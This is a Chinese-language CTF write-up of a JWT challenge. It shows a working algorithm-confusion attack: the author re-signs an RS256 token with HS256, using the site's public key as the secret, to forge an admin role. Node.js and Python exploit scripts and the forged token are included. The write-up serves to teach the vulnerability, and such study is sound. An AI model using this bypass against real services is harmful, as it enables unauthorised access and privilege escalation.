# JWT

此题考验对jwt的了解和jwt在开发应用中的错误应用
JWT是可以进行对称加密和非对称加密的
根据题意狸猫换太子，猜测可能是替换类型的题，在查看web资源时发现了一个`publicKey.pem`猜测估计后台使用的是非对称加密
![picture 2](https://libget.com/gkirito/blog/image/2021/image-20210302KCnvSt9e%402x.png)  
先把这个公钥下载下来，然后登录尝试后发现，随便普通登录都可，但是无法看到flag，需要管理员权限登录。
检查cookies发现了一个token
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiY3VzdG9tZXIiLCJpYXQiOjE2MTQ2NTMwMjh9.mgZbF8xpjdn-wcELV0lxDFUe_FP7Odfi4hz1qRf993-KnKwxW7igDx__e89MJnlT3vPhthE6g5zn5XXYW-UcNaof7NZgcCIv0j--jKhdVlefEFgBQFCWCTQMdnrYQTibsLhwZ6VrCQAnfqWlFm2Byig1H8jO0Km0T5Xwtx_KLMwJkvKL65NInh6RSLeB5eyp7R3YXBaejahJEUPigjlhb4xvmnEHbfgUVF3FIDsdfdyLu1R7tLe2AjSZH-d1xLK8hONBDqX9y3yOci_KHA8DaXwRvntwhtd5DlRYGeCk8AHcLZgPI5Jrw8UKPyAUKCTnOlV12_Lu2ad3X9KvYr0yNQ
``` 
解析后得到
``` json
{
    "alg": "RS256",
    "typ": "JWT"
}
{
    "iat": 1614653028,
    "role": "customer"
}
```
可以发现之前的猜测对了，是RS256的非对称加密，并且payload中role为customer，所以我们可以修改role为管理员，来绕过。但是JWT第三部分的验证需要重新签名，由于我们没有私钥无法实现RS256签名，但是考虑到题意的狸猫换太子，猜测可能后台的JWT校验支持对称解密，对称加密密钥可能直接用公钥来当secret了

根据以上思路，我们可以构建这样一个payload
``` json
{
    "alg": "HS256",
    "typ": "JWT"
}
{
    "iat": 1614653028,
    "role": "admin"
}
```
将role设置为admin，并在header部分设置加密为对称加密，然后我们编写脚本，使用jwt进行生成token，`HS256`对称加密的secret就用公钥`publicKey.pem`

nodejs exp：
``` js
const jwt = require('jsonwebtoken')
const fs = require('fs')
const publicKey = fs.readFileSync(__dirname + '/publicKey.pem')

const token = jwt.sign({ role: 'admin', "iat": 1614653028 }, publicKey, { algorithm: 'HS256' })
console.log(token)
```
需要一个`jsonwebtoken`的依赖，可以通过yarn或者npm添加一下
``` shell
yarn add jsonwebtoken
#或者
npm i jsonwebtoken -d
```

python exp：
``` python
import jwt
with open('./src/public/keys/publicKey.pem', 'rb') as publickfile:
    p = publickfile.read()
print(p)
encoded = jwt.encode({
    "role": "admin",
    "iat": 1614653028
}, p, algorithm="HS256")
print(encoded)
```
python环境
```
pyjwt==0.4.3
```

通过exp生成token，替换cookies中token的JWT内容，再次刷新网页
成功拿到flag
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTQ2NTMwMjh9.ztPcWw3ZNy5dElKN1Q4y-dgc4r8M804oCTrgKbNDZbo
```

![picture 3](https://libget.com/gkirito/blog/image/2021/image-20210302HY67485j%402x.png)  

